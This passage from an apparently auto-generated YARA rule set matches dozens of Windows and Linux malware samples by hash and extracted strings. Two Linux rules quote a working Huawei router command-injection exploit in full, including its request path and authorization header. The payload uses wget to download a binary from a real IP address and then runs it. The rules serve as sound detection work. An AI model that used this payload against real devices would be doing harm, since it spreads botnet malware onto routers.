        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "ZXIS8?"
        $s5 = "c`XGR8"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5209KB
        and all of them
}

rule Linux_6737d88486bee3a1f95cfddc00935749da9b37933d1ca13128ec068b3fab4ea4
{
    meta:
        description = "Auto ML: 6737d88486bee3a1f95cfddc00935749da9b37933d1ca13128ec068b3fab4ea4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "POST /cdn-cgi/"
        $s2 = "HTTP/1.1"
        $s3 = "User-Agent:"
        $s4 = "Cookie:"
        $s5 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ012345678"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 78KB
        and all of them
}

rule Linux_67470400f8dc720fbfa14c260c011b6bf30ffb1ee80dcbfe71200c5de252a9c5
{
    meta:
        description = "Auto ML: 67470400f8dc720fbfa14c260c011b6bf30ffb1ee80dcbfe71200c5de252a9c5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 157KB
        and all of them
}

rule Windows_675eae5e18d018109f42efb7c76c9ac83af9ffd9e010d39acbb6a12450d6d1eb
{
    meta:
        description = "Auto ML: 675eae5e18d018109f42efb7c76c9ac83af9ffd9e010d39acbb6a12450d6d1eb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = ")=*F*Q*Y*b*l*v*"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4638KB
        and all of them
}

rule Windows_67872249c80e5ecfa6ea2f7f87c1fd90021aef6f70f752f8ea9539b1c6f89f85
{
    meta:
        description = "Auto ML: 67872249c80e5ecfa6ea2f7f87c1fd90021aef6f70f752f8ea9539b1c6f89f85"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".didata"
        $s5 = ".edata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3137KB
        and all of them
}

rule Windows_67910cf27c732b63041567c28e40cfec63c7e7c3bf96fd0498194d016706afd7
{
    meta:
        description = "Auto ML: 67910cf27c732b63041567c28e40cfec63c7e7c3bf96fd0498194d016706afd7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "VLUp*k"
        $s3 = "yFi_fo"
        $s4 = "ioq8Ou<"
        $s5 = "N.;mLF"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1652KB
        and all of them
}

rule Windows_679a262683269630fd0a597ca8a8495766d6a2950c406e12c821c9b19c290d23
{
    meta:
        description = "Auto ML: 679a262683269630fd0a597ca8a8495766d6a2950c406e12c821c9b19c290d23"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "s495LCB"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4438KB
        and all of them
}

rule Windows_67d39d9194a79f2f1aa0585b8cbc3a38a651964d72469e27692a62038ae3b412
{
    meta:
        description = "Auto ML: 67d39d9194a79f2f1aa0585b8cbc3a38a651964d72469e27692a62038ae3b412"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "0WWWWW"
        $s5 = "QQSVWd"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1957KB
        and all of them
}

rule Linux_0967b7aca84aa469261ab69595f81a601eede01b1c565fd58ce8fc2a18128449
{
    meta:
        description = "Auto ML: 0967b7aca84aa469261ab69595f81a601eede01b1c565fd58ce8fc2a18128449"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "(Q0HgR"
        $s2 = "ACSZY5T"
        $s3 = ">V1zJEp"
        $s4 = "~O%zUM"
        $s5 = "Yo?XAb"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 69KB
        and all of them
}

rule Windows_6800905847788c228e211fd1086dad6a20aa745d1351c0bd43d5f89aa58b1c9e
{
    meta:
        description = "Auto ML: 6800905847788c228e211fd1086dad6a20aa745d1351c0bd43d5f89aa58b1c9e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "ffefeeffefea("
        $s5 = "fefefeffea"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 534KB
        and all of them
}

rule Linux_68082254cd8b7e129b468d63f5663bf0f789009e796abce9ac41ccd881f9003c
{
    meta:
        description = "Auto ML: 68082254cd8b7e129b468d63f5663bf0f789009e796abce9ac41ccd881f9003c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 185.224.128.187 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 141KB
        and all of them
}

rule Windows_6809cbf33e60910d18f847f7413ab46487685aa945ee954c3fbb63e82e633a93
{
    meta:
        description = "Auto ML: 6809cbf33e60910d18f847f7413ab46487685aa945ee954c3fbb63e82e633a93"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.reloc"
        $s5 = "Phff B"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2516KB
        and all of them
}

rule Windows_683391c9e997f8e960c52edb11106157fb4bf122d21a0a72fe6a9a14ebacf584
{
    meta:
        description = "Auto ML: 683391c9e997f8e960c52edb11106157fb4bf122d21a0a72fe6a9a14ebacf584"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "GtYZ[X"
        $s5 = "OOOOOO"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 421KB
        and all of them
}

rule Linux_6839f298def7b6c2053c9f9d5de35896d33b5d373b9839b0ae57c98420338a14
{
    meta:
        description = "Auto ML: 6839f298def7b6c2053c9f9d5de35896d33b5d373b9839b0ae57c98420338a14"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "@(vice"
        $s2 = "CpX[A\\"
        $s3 = "CpZ[A\\"
        $s4 = "AUATUSH"
        $s5 = "Z[]A\\A]L"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Windows_684bcee9dcb5326013108c4f4fb40dce8d98bc937a00b64e9d9f9754d0c78377
{
    meta:
        description = "Auto ML: 684bcee9dcb5326013108c4f4fb40dce8d98bc937a00b64e9d9f9754d0c78377"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".logulax"
        $s5 = "0WWWWW"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB
        and all of them
}

rule Windows_689ef1d29c263f78c9626e00500983e2589d28068a72fadba9a4b04b7eafbcaf
{
    meta:
        description = "Auto ML: 689ef1d29c263f78c9626e00500983e2589d28068a72fadba9a4b04b7eafbcaf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "Xfefefeffe"
        $s5 = "afefeffefeefa"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 857KB
        and all of them
}

rule Windows_68aabd5eb17a4e1025b7e62cbcbc7714ab8f6d371842c7f1561fd62a86e82676
{
    meta:
        description = "Auto ML: 68aabd5eb17a4e1025b7e62cbcbc7714ab8f6d371842c7f1561fd62a86e82676"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".didat"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 978KB
        and all of them
}

rule Linux_690843128f27403b327803722537c80b6f58990d8ac7a420fd4dae51561d9953
{
    meta:
        description = "Auto ML: 690843128f27403b327803722537c80b6f58990d8ac7a420fd4dae51561d9953"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$SXB$t"
        $s2 = "http://"
        $s3 = "https://"
        $s4 = "0123456789abcdef"
        $s5 = "/proc/%d/exe"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 156KB
        and all of them
}

rule Windows_690c0f2a15eb6e975fce4a36d62cf29158825bb4f6e4e8313855e8181f45e2d3
{
    meta:
        description = "Auto ML: 690c0f2a15eb6e975fce4a36d62cf29158825bb4f6e4e8313855e8181f45e2d3"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "G:CvfV"
        $s3 = "\\,VTbm"
        $s4 = "k%jPJo"
        $s5 = "s.f}db"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1224KB
        and all of them
}

rule Linux_097d92f9c38dc1fae556478a8a1a921c80a75c88f26e94a943331f794751be13
{
    meta:
        description = "Auto ML: 097d92f9c38dc1fae556478a8a1a921c80a75c88f26e94a943331f794751be13"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "hEf3sF;"
        $s2 = "/utUxu"
        $s3 = "|G/*WDr"
        $s4 = "J:@jTy"
        $s5 = "\\ii9:Gu@r"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 36KB
        and all of them
}

rule Windows_6915569f0193d21234ac6895ea64e29773d50d6d8589f02e778cccabfe5f5e90
{
    meta:
        description = "Auto ML: 6915569f0193d21234ac6895ea64e29773d50d6d8589f02e778cccabfe5f5e90"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "IEnumerable`1"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 693KB
        and all of them
}

rule Linux_6926581df13527c07c4b0677102523929fc2873ecddd99034fd72f9159f22533
{
    meta:
        description = "Auto ML: 6926581df13527c07c4b0677102523929fc2873ecddd99034fd72f9159f22533"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "I<Gw{*Zn1"
        $s2 = "V+h}*BF"
        $s3 = "F5JX^Gw"
        $s4 = "nnID6)"
        $s5 = "YSg<0|j"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 52KB
        and all of them
}

rule Linux_69cfc80ea4c35a6d9ee9518a1424c13ca252a3f1b1ee1f652d766bc9bcaa307f
{
    meta:
        description = "Auto ML: 69cfc80ea4c35a6d9ee9518a1424c13ca252a3f1b1ee1f652d766bc9bcaa307f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HFu8sfga"
        $s2 = "XM`h5p"
        $s3 = "@K/)rOy"
        $s4 = "[Zk-SD"
        $s5 = "Wh/(fK"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 30KB
        and all of them
}

rule Windows_69dcabf46703032a4de46d1bb3f9e66dab4492f5bbbfb02ce5ddc751239f75bf
{
    meta:
        description = "Auto ML: 69dcabf46703032a4de46d1bb3f9e66dab4492f5bbbfb02ce5ddc751239f75bf"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".didata"
        $s5 = ".edata"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3200KB
        and all of them
}

rule Linux_6a09c3ab5061b5f9ec90614822dd1d4511029ecfb77643e69ef38352894804dd
{
    meta:
        description = "Auto ML: 6a09c3ab5061b5f9ec90614822dd1d4511029ecfb77643e69ef38352894804dd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "SNQUERY: 127.0.0.1:AAAAAA:xsvr"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "HOST: 255.255.255.255:1900"
        $s4 = "MAN: \"ssdp:discover\""
        $s5 = "ST: urn:dial-multiscreen-org:service:dial:1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 151KB
        and all of them
}

rule Windows_6a244c788077dae0c56075ef30f10720953d8183a9caad1bba548224a053bfa7
{
    meta:
        description = "Auto ML: 6a244c788077dae0c56075ef30f10720953d8183a9caad1bba548224a053bfa7"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "label10"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 647KB
        and all of them
}

rule Linux_6a310e25d2181dcc4e96f9bcdef2017c448c6942e07baeb617da865ac6e5006b
{
    meta:
        description = "Auto ML: 6a310e25d2181dcc4e96f9bcdef2017c448c6942e07baeb617da865ac6e5006b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "EBUPX!,"
        $s2 = "*CPT&KT"
        $s3 = "ZyDz6{KX."
        $s4 = "Lr!dh08"
        $s5 = "%C+DEx"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 29KB
        and all of them
}

rule Windows_6a39b6b391dc78eec218057c201e7bc33085d5e8722346b347547ee8bca6ceb5
{
    meta:
        description = "Auto ML: 6a39b6b391dc78eec218057c201e7bc33085d5e8722346b347547ee8bca6ceb5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "string"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6255KB
        and all of them
}

rule Windows_6a4a7355b992673eecda83e99103ddd832d993ba1e66521a36f69a9d38ce5418
{
    meta:
        description = "Auto ML: 6a4a7355b992673eecda83e99103ddd832d993ba1e66521a36f69a9d38ce5418"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "DRich="
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = ".hojipev|"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB
        and all of them
}

rule Windows_6a546d75556d9fec84c5a82dcafe0dbca854020ff13e3292c0e9b1efc5cca2a4
{
    meta:
        description = "Auto ML: 6a546d75556d9fec84c5a82dcafe0dbca854020ff13e3292c0e9b1efc5cca2a4"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.sdata"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "D1DTDaDgDuD"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5329KB
        and all of them
}

rule Linux_099e14ef118090e2c477c47b199cd5ba0d7977b5b4bb62071453011f5cf56eec
{
    meta:
        description = "Auto ML: 099e14ef118090e2c477c47b199cd5ba0d7977b5b4bb62071453011f5cf56eec"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "(vmab/"
        $s3 = ".vQllw["
        $s4 = "APe|l3j"
        $s5 = "R#ay!p1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 130KB
        and all of them
}

rule Linux_6a7ea8868a2726330ee53f618167f6a4fbac20be141b4f600ae53731eb846bdc
{
    meta:
        description = "Auto ML: 6a7ea8868a2726330ee53f618167f6a4fbac20be141b4f600ae53731eb846bdc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Lds`La"
        $s2 = "APe|l3j"
        $s3 = "AmH|g;\"'"
        $s4 = "Q]cln\\"
        $s5 = "R#ay!p1"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 63KB
        and all of them
}

rule Windows_6a861eb0176a0f7e0c4d69f2a65856d739bd4829448e72add40fabb9bf439634
{
    meta:
        description = "Auto ML: 6a861eb0176a0f7e0c4d69f2a65856d739bd4829448e72add40fabb9bf439634"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".ndata"
        $s5 = "Instu`"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 624KB
        and all of them
}

rule Windows_6a8764f48723b273ce89f68cd92e5346cd72c8fb859d409b2907837c70c52d01
{
    meta:
        description = "Auto ML: 6a8764f48723b273ce89f68cd92e5346cd72c8fb859d409b2907837c70c52d01"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!UUUUUUUU"
        $s5 = "hXhS+^"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3190KB
        and all of them
}

rule Windows_6ab25b50183214c0349b233d73b6fe1ba1d8b0dff45ffe2a5b6161da468147d1
{
    meta:
        description = "Auto ML: 6ab25b50183214c0349b233d73b6fe1ba1d8b0dff45ffe2a5b6161da468147d1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.reloc"
        $s3 = "B.rsrc"
        $s4 = "ffefeeffefea("
        $s5 = "fefefeffea"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 203KB
        and all of them
}

rule Linux_6ac22a2ffff11e63d6ff1b8c08d5fcff2e12ef16e4a72c17a52adef74e9766e0
{
    meta:
        description = "Auto ML: 6ac22a2ffff11e63d6ff1b8c08d5fcff2e12ef16e4a72c17a52adef74e9766e0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "B#amA(1"
        $s2 = "Lds`H$"
        $s3 = "/Ln\"Op"
        $s4 = "/Ln\"Oq"
        $s5 = "\"OCYDX"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 77KB
        and all of them
}

rule Linux_6aee5a31455e929c7a8a33b8104a474ba88eff9aba68de5886294ca520d820a5
{
    meta:
        description = "Auto ML: 6aee5a31455e929c7a8a33b8104a474ba88eff9aba68de5886294ca520d820a5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "<?xml version=\"1.0\" ?><s:Envelope xmlns:s=\"http://schemas.xmlsoap.org/soap/envelope/\" s:encodingStyle=\"http://schemas.xmlsoap.org/soap/encoding/\"><s:Body><u:Upgrade xmlns:u=\"urn:schemas-upnp-org:service:WANPPPConnection:1\"><NewStatusURL>$(/bin/busybox wget -g 45.95.147.171 -l /tmp/.oxy -r /mips; /bin/busybox chmod 777 /tmp/.oxy; /tmp/.oxy selfrep.huawei)</NewStatusURL><NewDownloadURL>$(echo HUAWEIUPNP)</NewDownloadURL></u:Upgrade></s:Body></s:Envelope>"
        $s2 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s3 = "Connection: keep-alive"
        $s4 = "Accept: */*"
        $s5 = "Authorization: Digest username=\"dslf-config\", realm=\"HuaweiHomeGateway\", nonce=\"88645cefb1f9ede0e336e3569d75ee30\", uri=\"/ctrlt/DeviceUpgrade_1\", response=\"3612f843a42db38f48f59d2a3597e19c\", algorithm=\"MD5\", qop=\"auth\", nc=00000001, cnonce=\"248d1a2560100669\""

    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB
        and all of them
}

rule Linux_6afdae2d4e26961412850f7ded79b40919e043b3d1a82ba2afa454c59bd9505a
{
    meta:
        description = "Auto ML: 6afdae2d4e26961412850f7ded79b40919e043b3d1a82ba2afa454c59bd9505a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "N^NuNV"
        $s2 = "$N^NuNV"
        $s3 = "OHWHQHy"
        $s4 = "b.pW B"
        $s5 = "$_NuNV"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 60KB
        and all of them
}

rule Windows_6b05772e39ea7ae4c3396fbedc1e5a462db3cd611be8548f452b2ec19f1581c0
{
    meta:
        description = "Auto ML: 6b05772e39ea7ae4c3396fbedc1e5a462db3cd611be8548f452b2ec19f1581c0"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2543KB
        and all of them
}

rule Windows_6b6aa6f3eafabe7135d78cc7dc61bfbbef60854ee7d64790da42aedcfc996dbb
{
    meta:
        description = "Auto ML: 6b6aa6f3eafabe7135d78cc7dc61bfbbef60854ee7d64790da42aedcfc996dbb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "I@wliP0e8"
        $s5 = "Z7GKwkw"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1032KB
        and all of them
}

rule Windows_6b8e428cff996c49aa52e017213c7016880a2bc1583d051240c74992bf83c357
{
    meta:
        description = "Auto ML: 6b8e428cff996c49aa52e017213c7016880a2bc1583d051240c74992bf83c357"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "Rich3%"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 427KB
        and all of them
}

rule Windows_09ceeefd3297e4ec6e500bb98bc0c8472f0e995834cba8a9673eeafd26117cff
{
    meta:
        description = "Auto ML: 09ceeefd3297e4ec6e500bb98bc0c8472f0e995834cba8a9673eeafd26117cff"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "#Strings"
        $s5 = "<Module>"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 54KB
        and all of them
}

rule Windows_6b9698cd2668202190045c9a635e89e4fbd72ecf63d1484f05f92f724fcdd440
{
    meta:
        description = "Auto ML: 6b9698cd2668202190045c9a635e89e4fbd72ecf63d1484f05f92f724fcdd440"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "P`.data"
        $s3 = ".rdata"
        $s4 = "mCqruT"
        $s5 = "RAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15KB
        and all of them
}

rule Linux_6b9a43948a22157bf3ae9d78e67f0bc96f8a7a418c22702be2026685a61c9d7c
{
    meta:
        description = "Auto ML: 6b9a43948a22157bf3ae9d78e67f0bc96f8a7a418c22702be2026685a61c9d7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "wsX2c7_"
        $s2 = "?Gx$2dB"
        $s3 = "F=K,k#v;\\%;K`"
        $s4 = "]+lukd"
        $s5 = "x'Qw4w"

    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB
        and all of them
}

rule Windows_6b9a6412f2be50608dcca1f79b749a9b8f9b61c0576dd8ae2e2e724227530e12
{
    meta:
        description = "Auto ML: 6b9a6412f2be50608dcca1f79b749a9b8f9b61c0576dd8ae2e2e724227530e12"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = "`.itext"
        $s3 = "`.data"
        $s4 = ".rdata"
        $s5 = "@.reloc"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 503KB
        and all of them
}

rule Windows_6bca1f55e5acc5b3c5d3848ef558c5e1b5a64ccb6041f3f2c7430dd46fd90f7c
{
    meta:
        description = "Auto ML: 6bca1f55e5acc5b3c5d3848ef558c5e1b5a64ccb6041f3f2c7430dd46fd90f7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This program cannot be run in DOS mode."
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".pdata"
        $s5 = "@_RDATA"

    condition:
        uint32(0) == 0x00905a4d and
        filesize < 18098KB
        and all of them
}

rule Windows_6c0ac1e5fa97f92b6acc9594fa33513cb11849f3a1588ec95834b4fe650c08eb
{
    meta:
